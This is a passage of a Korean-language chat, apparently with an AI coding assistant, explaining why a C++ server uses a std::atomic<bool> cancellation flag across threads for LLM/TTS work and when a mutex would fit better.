  // 별도 스레드에서 단계마다 확인
  std::thread([self, hist]() {
      if (self->cancelled_) return;  // LLM 전 확인
      auto llmRaw = self->llm_->chat(...);

      if (self->cancelled_) return;  // TTS 전 확인
      auto audio = self->tts_->synthesize(...);

      net::post(self->strand_, [self, ...]() {
          if (self->cancelled_) return;  // 전송 전 확인
          self->sendJson(...);
          self->sendBinary(audio);
      });
  }).detach();

  ---
  실제 흐름

  [strand]              [별도 스레드]

  cancelled_ = false
  LLM 시작 ────────────▶ LLM 대기 중...

  브라우저 연결 끊김
  cancelled_ = true

                         LLM 완료
                         if(cancelled_) return  ← 여기서 중단
                         TTS 건너뜀 ✅
                         sendJson 건너뜀 ✅

  ---
  왜 atomic<bool>인가

  std::atomic<bool> cancelled_{false};

  cancelled_는 두 곳에서 접근합니다:

  strand 스레드    →  cancelled_ = true  (쓰기)
  별도 스레드      →  if(cancelled_)     (읽기)

  동시에 접근 → race condition 위험

  atomic은 잠금 없이 안전하게 읽기/쓰기를 보장합니다:

  // 일반 bool — 위험
  bool cancelled_ = false;
  // 스레드A 쓰는 중 + 스레드B 읽는 중 → 값 깨짐 ❌

  // atomic<bool> — 안전
  std::atomic<bool> cancelled_{false};
  // 항상 정확한 값 보장 ✅

  ---
  Java와 비교

  // Java
  private volatile boolean cancelled = false;
  // volatile — 스레드 간 가시성 보장

  // C++
  std::atomic<bool> cancelled_{false};
  // atomic — 가시성 + 원자적 연산 보장

  ---
  한 줄 요약

  ▎ 브라우저 연결이 끊겼을 때 별도 스레드에서 진행 중인 LLM/TTS 작업이 결과를 전송하지 않도록 막는 플래그입니다. 두 스레드에서 동시 접근하므로 atomic으로
  ▎ 선언합니다.

```

```
❯ `atomic` 말고 `mutex` 쓰면 안 돼?

● mutex도 쓸 수 있지만 atomic이 더 적합합니다.

  ---
  mutex로 구현하면

  std::mutex mtx_;
  bool cancelled_ = false;

  // 쓰기
  {
      std::lock_guard<std::mutex> lock(mtx_);
      cancelled_ = true;
  }

  // 읽기
  {
      std::lock_guard<std::mutex> lock(mtx_);
      if (cancelled_) return;
  }

  동작은 하지만 불필요하게 복잡합니다.

  ---
  atomic으로 구현하면

  std::atomic<bool> cancelled_{false};

  // 쓰기
  cancelled_ = true;

  // 읽기
  if (cancelled_) return;

  훨씬 단순합니다.

  ---
  언제 뭘 쓰나

  bool 하나만 읽고 쓰는 경우
          ↓
  atomic ✅ — 단순, 빠름

  여러 변수를 묶어서 한 번에 변경해야 하는 경우
          ↓
  mutex ✅ — 여러 변수를 묶어서 보호 가능

  예시:

  // mutex가 필요한 경우
  // cancelled_, errorCode_, errorMessage_ 세 개를 동시에 변경
  {
      std::lock_guard<std::mutex> lock(mtx_);
      cancelled_    = true;
      errorCode_    = 500;
      errorMessage_ = "연결 끊김";
  }
  // 세 변수가 항상 일관된 상태 보장

  atomic으로는 세 변수를 원자적으로 묶을 수 없습니다:

  cancelled_    = true;   // 여기서 다른 스레드가 읽으면
  errorCode_    = 500;    // 아직 errorCode_는 옛날 값 ❌
  errorMessage_ = "...";

  ---
  성능 비교

  atomic:
      하드웨어 명령어 1개로 처리
      잠금 없음 → 빠름

  mutex:
      잠금 → 대기 → 해제
      오버헤드 있음 → 느림

  ---
  이 코드에서 atomic이 맞는 이유

  cancelled_ = true;      // 쓰기 1번
  if (cancelled_) return; // 읽기 1번

  변수 1개, 단순 읽기/쓰기
  → atomic으로 충분 ✅
  → mutex는 과함 ❌

  ---
  한 줄 요약

  ▎ mutex도 동작하지만 단순한 bool 하나를 읽고 쓰는 경우엔 atomic이 더 단순하고 빠릅니다. mutex는 여러 변수를 묶어서 일관성을 보장해야 할 때 씁니다.

```

```

```
